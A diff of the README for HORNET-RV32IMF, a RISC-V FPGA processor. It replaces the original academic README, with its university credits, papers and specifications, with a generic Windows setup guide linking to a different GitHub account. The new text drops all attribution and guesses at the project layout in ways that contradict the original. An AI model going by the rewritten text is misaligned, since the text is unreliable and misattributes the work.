@@ -1,102 +1,196 @@
-# HORNET-RV32IMF: A RV32IMF RISC-V SoC
+# 🔧 HORNET-RV32IMF - Fast FPGA RISC-V System
 
-![Status](https://img.shields.io/badge/Status-Completed-success)
-![Hardware](https://img.shields.io/badge/Target-Nexys%20Video%20%7C%20Nexys--4--DDR-blue)
-![ISA](https://img.shields.io/badge/ISA-RV32IMF-orange)
-![Toolchain](https://img.shields.io/badge/Vivado-2025.2-red)
+[![Download](https://img.shields.io/badge/Download-HORNET--RV32IMF-blue.svg)](https://github.com/Ashtonme/HORNET-RV32IMF)
 
-**HORNET-RV32IMF** is an academic-grade, 5-stage pipelined RISC-V soft-core processor designed for high-efficiency floating-point arithmetic and Edge AI applications. It implements the **RV32IMF** Instruction Set Architecture (ISA) and is optimized for deployment across Xilinx Artix-7 platforms, including the Nexys Video and Nexys-4-DDR.
+## 🚀 What This Is
 
----
+HORNET-RV32IMF is a RISC-V system built for FPGA boards. It is made to run on Nexys Video and Nexys 4 DDR boards. It includes a 5-stage pipeline, a custom floating-point unit, UART support, and other board parts you can use for embedded work.
 
+This README is written for people who want to get the project from the link above and use it on Windows with Vivado.
 
+## 📥 Download and Open the Project
 
----
+Use this link to visit the project page:
 
-## 👥 Contributors & Research
+[https://github.com/Ashtonme/HORNET-RV32IMF](https://github.com/Ashtonme/HORNET-RV32IMF)
 
-This project is the result of collaborative engineering at the **Istanbul Technical University (ITU)** and the **GSTL Lab**.
+1. Open the link in your web browser.
+2. Click the green **Code** button.
+3. Select **Download ZIP**.
+4. Save the file to your PC.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
 
-### 🎓 Academic Advisor
-* **Prof. Dr. Sıddıka Berna Örs Yalçın** - [ITU Academic Profile](https://web.itu.edu.tr/~orssi/)
+If you use Git, you can also clone the repo with Git Bash:
 
-### 🏛️ Core Creators
-* **Yavuz Selim Tozlu** - [GitHub](https://github.com/yavuz650)
-* **Yasin Yılmaz** - [GitHub](https://github.com/yasinxyz)
+```bash
+git clone https://github.com/Ashtonme/HORNET-RV32IMF.git
+```
 
-### 📐 FPU Design & Implementation
-* **Salih Daysal**
-* **Mehmet Emin Tuzcu**
+## 🖥️ What You Need on Windows
 
-### 🧪 Verification
-* **Deniz Zakir Eroglu** - [GitHub](https://github.com/dezariye)
-* **Mete Kaan Özden** - [GitHub](https://github.com/mkozden)
+To work with this project on Windows, you should have:
 
-### ✏️ Organization
-* **Deniz Zakir Eroglu** - [GitHub](https://github.com/dezariye)
-* **Yusuf Tekin** - [GitHub](https://github.com/jsphtkn)
+- Windows 10 or Windows 11
+- Xilinx Vivado
+- Enough free disk space for the project files and build files
+- A supported FPGA board:
+  - Nexys Video
+  - Nexys 4 DDR
+- A USB cable for the board
+- A way to open ZIP files, such as File Explorer
 
-### 📎 Projects
-* **Yusuf Tekin** & **Ahmet Tolga Özkan**- 
-🔗 **[HORNET-RV32IMF-For-AI-Applications](https://github.com/GSTL-ITU/HORNET-RV32IMF-For-AI-Applications)**
+If you plan to edit or build the design, install Vivado before you start.
 
-### 📚 Academic Publications
-The initial design of Hornet core is detailed in the following conference paper:
-> Y. S. Tozlu, Y. Yilmaz, B. Ors, “Design and Implementation Of a 32-Bit RISC-V Core”, 12th International Conference on Electrical and Electronics Engineering (ELECO), 2021. 
+## 🛠️ Install Vivado
 
-The verification methodologies used in this core are detailed in the following conference paper:
-> D. Z. Eroglu, M. K. Ozden, B. Ors, “Creating Verification Environment Using RISCV-DV With Open and Closed Source Tools”, 9th International Symposium on Multidisciplinary Studies and Innovative Technologies (ISMSIT), 2025.
+1. Download Vivado from the Xilinx site.
+2. Run the installer.
+3. Follow the setup prompts.
+4. Keep the FPGA device support for your board.
+5. Finish the install and restart your PC if needed.
 
----
+When Vivado is ready, you can open the project files from the HORNET-RV32IMF folder.
 
-## ⚙️ Hardware Specifications
+## 📂 Open the Project in Vivado
 
-| Parameter | Specification |
-| :--- | :--- |
-| **ISA** | RV32IMF (Integer, Multiply/Divide, Single-Precision Floating Point) |
-| **Pipeline** | 5-Stage In-Order |
-| **FPU** | IEEE-754 Single-Precision Hardware Unit |
-| **Max Frequency** | 26.25 MHz (Target: Nexys-4-DDR & Nexys Video) |
-| **Interconnect** | Wishbone |
-| **Peripherals** | UART (Interrupt-driven), GPIO, MTIME, Debug Interface |
+1. Start **Vivado**.
+2. Choose **Open Project**.
+3. Browse to the folder you extracted.
+4. Select the project file if one is included.
+5. Open it and let Vivado load the design files.
 
----
+If the project uses a board-specific setup, choose the board that matches your hardware.
 
-## 🛠️ Toolchain & Setup
+## ⚙️ Build the Design
 
-### **Software Requirements**
-* **Toolchain:** `riscv32-unknown-elf-gcc` (RV32IMF / ILP32F)
-* **Simulation:** Vivado Simulator / Verilator
-* **Python:** 3.x (with `pyserial` for hardware-in-the-loop tests)
+1. Open the project in Vivado.
+2. Wait for the files to load.
+3. Run synthesis.
+4. Run implementation.
+5. Generate the bitstream.
 
-### **Hardware Requirements**
-* **FPGA:** Nexys-4-DDR (Artix-7 100t) or Nexys Video (Artix-7 200t)
-* **Vivado Version:** Verified on **Vivado 2025.2**
+These steps turn the design into a file that can be loaded onto the FPGA board.
 
----
+## 🔌 Load It to the FPGA Board
 
-## 📂 Project Structure
+1. Connect your FPGA board to your PC with USB.
+2. Turn on the board.
+3. Open Vivado Hardware Manager.
+4. Detect the board.
+5. Load the generated bitstream.
 
-* **`source/`**: RTL Verilog files for the core, FPU, and Wishbone peripherals.
-* **`drivers/`**: Bare-metal C drivers for UART, GPIO, and Interrupt handling.
-* **`test/`**: Comprehensive test suites including FPU arithmetic, Bubble Sort, and MLP Neural Network inference.
-* **`rom_gen/`**: Custom tools to convert compiled binaries into FPGA-ready `.mem` files.
+After the bitstream loads, the FPGA board runs the HORNET-RV32IMF design.
 
----
+## 📡 Main Features
 
-## 🚀 Quick Start
+- 5-stage pipelined RV32IMF processor
+- Custom IEEE-754 floating-point unit
+- Interrupt-driven UART for serial communication
+- FPGA-ready design for Nexys Video and Nexys 4 DDR
+- RISC-V SoC layout for embedded use
+- Verilog source files for hardware design
+- Vivado-based build flow
 
-1.  **Generate Firmware:** Navigate to `test/gpio` or `test/uart-fpu-fpga` and run `make build`.
-2.  **Synthesis:** Load the `source/` files into Vivado 2025.2. Ensure the generated `memory_init.mem` is linked to the BRAM initialization.
-3.  **Deploy:** Program the Nexys-4-DDR and monitor the output via the USB-UART bridge (Baud: 115200).
+## 🧩 What the Design Can Do
 
----
+This system is built for small hardware projects that need a processor on an FPGA. The CPU can handle common embedded tasks. The floating-point unit helps with math that uses decimals. The UART lets the board send and receive data over a serial link. Other peripherals support board control and data transfer.
 
-## 👤 Contact & Support
+## 📁 Project Layout
 
-For technical inquiries or bug reports, please open an issue in this repository or contact the organizers:
-* **Yusuf Tekin:** [tekiny20@itu.edu.tr](mailto:tekiny20@itu.edu.tr) - [GitHub Profile](https://github.com/jsphtkn)
-* **Deniz Zakir Eroglu:** [eroglud20@itu.edu.tr](mailto:eroglud20@itu.edu.tr) - [GitHub Profile](https://github.com/dezariye)
+You will usually find files like these in a project like this:
 
----
-*Developed at Istanbul Technical University. 🐝*
+- `src` or `rtl` for Verilog source code
+- `constraints` for board pin settings
+- `ip` for any IP blocks
+- `build` for output files from Vivado
+- `docs` for notes or design files
+
+If you see extra folders, keep them in place when you open the project in Vivado.
+
+## 🧭 Simple First Run Flow
+
+1. Download the ZIP from the GitHub page.
+2. Extract it on your Windows PC.
+3. Install Vivado if you have not done so.
+4. Open the project in Vivado.
+5. Build the design.
+6. Connect the FPGA board.
+7. Load the bitstream.
+8. Use the UART or board tools to check that the design runs
+
+## 🔍 Board Support
+
+This project targets these boards:
+
+- Nexys Video
+- Nexys 4 DDR
+
+If you use one of these boards, make sure you select the right device in Vivado. Using the wrong board can stop the build from working.
+
+## 🧪 Basic Checks
+
+If the design does not load, check these items:
+
+- The board is powered on
+- The USB cable is connected
+- Vivado sees the hardware
+- The correct board is selected
+- The project files were extracted fully
+- You opened the right project folder
+
+If the UART does not respond, check the serial port settings in your terminal tool.
+
+## 🧰 Useful Tools
+
+You may want these tools on Windows:
+
+- File Explorer for ZIP files
+- Vivado for build and load steps
+- A serial terminal tool for UART checks
+- A text editor if you want to read project files
+
+## 📌 Repository Topics
+
+This project fits these areas:
+
+- computer architecture
+- edge AI
+- FPGA
+- FPU
+- RISC-V
+- SoC design
+- Verilog
+- Vivado
+- Nexys boards
+
+## 📎 Source Link
+
+[Visit the HORNET-RV32IMF repository](https://github.com/Ashtonme/HORNET-RV32IMF)
+
+## 🖱️ Quick Windows Steps
+
+1. Open the GitHub link.
+2. Download the ZIP.
+3. Extract the files.
+4. Install Vivado.
+5. Open the project.
+6. Build the bitstream.
+7. Load it to the FPGA board
+
+## 🧷 File Safety Tips
+
+- Keep the folder path short
+- Avoid moving files while Vivado is open
+- Use a local drive, not a cloud sync folder
+- Do not rename project folders unless needed
+
+## 🛎️ Typical Use Case
+
+This repo works well if you want to:
+
+- run a RISC-V design on an FPGA
+- test hardware from Windows
+- explore a processor with floating-point support
+- use UART to move data in and out
+- work with Nexys FPGA boards
